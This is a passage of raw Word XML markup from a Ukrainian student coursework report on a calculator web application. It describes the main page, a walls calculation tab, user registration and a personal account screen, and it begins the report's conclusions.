      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>процесу</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>додатком</w:t>
      </w:r>
      <w:bookmarkEnd w:id="23"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">На </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>малюнку</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.5 наведено </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>скрін</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>головній</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>сторінці</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> де доступна </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>реєстрація</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>перехід</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> на </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>розрахункові</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>форми</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> де і </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>відбуватиметься</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>обчислення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>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36615" cy="3221355"/>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6615" cy="322135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2.5 - головна форма</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При натисканні на вкладку «Стіни» можна побачити малюнок 2.6 на якому доступні для введення в осередку даних, і за допомогою введених даних буду проводитися розрахунки </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>калькудятора</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve">, за таким принципом були створенні і інші 2 форми. </w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5866130" cy="1652905"/>
            <wp:effectExtent l="0" t="0" r="127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66130" cy="165290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2.6 - вкладка обчислень «стіни»</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spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Для входу в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>аккаунт</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> потрібно зареєструватися. Реєстрація </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>проиходит</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> у вкладка «Реєстрація» де задані обмеження по введенню. Паролі обов'язково повинні збігатися малюнок 2.7</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29630" cy="34328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29630" cy="3432810"/>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2.7 - форма реєстрації</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>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tab/>
        <w:t>Нижче наведено приклад введення даних і заповнення всіх полів на малюнок 2.8</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36615" cy="347472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6615" cy="3474720"/>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2.8 - реєстрація з заповненими полями</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spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>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t xml:space="preserve">Користувач був створений і внесений в базу даних, цього </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>свідетільствует</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>ібораженіе</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> на малюнок 2.9</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36615" cy="345376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6615" cy="345376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2.9 - користувач зареєстрований</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>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t xml:space="preserve">Ввели </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>данни</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> і увійшли в профіль Васі, де можуть зберігатися його </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t>закаси</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:t xml:space="preserve"> малюнок 2.10</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36615" cy="32639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6615" cy="3263900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:solidFill>
                      <a:srgbClr val="FFFFFF"/>
                    </a:solidFill>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF"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2.10 - Особистий кабінет</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:keepNext/>
        <w:pageBreakBefore/>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc10727439"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:lang w:val="uk-UA"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ВИСНОВКИ</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">На </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>сьогоднішній</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> день </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Програмні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застосункі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дозволяють</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ефективного</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зберігаті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структурувати</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>сістематізуваті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Великі</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ОБСЯГИ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Даних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. І без них </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Неможливо</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уявіті</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> роботу </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>більшості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промислових</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торгівельних</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> ОРГАНІЗАЦІЙ.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Використання</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технологій</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дозволяє</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Зберегти</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значні</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кошти</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, а головне і Час для </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Отримання</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необхідної</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> информации. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Виконання</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даної</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курсової</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роботи</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> дозволило </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>мені</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>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розшіріті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закріпіті</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>сістематізуваті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теоретичні</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> та </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Практичні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знання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> в рамках </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>дисципліни</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Symbol" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, что </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
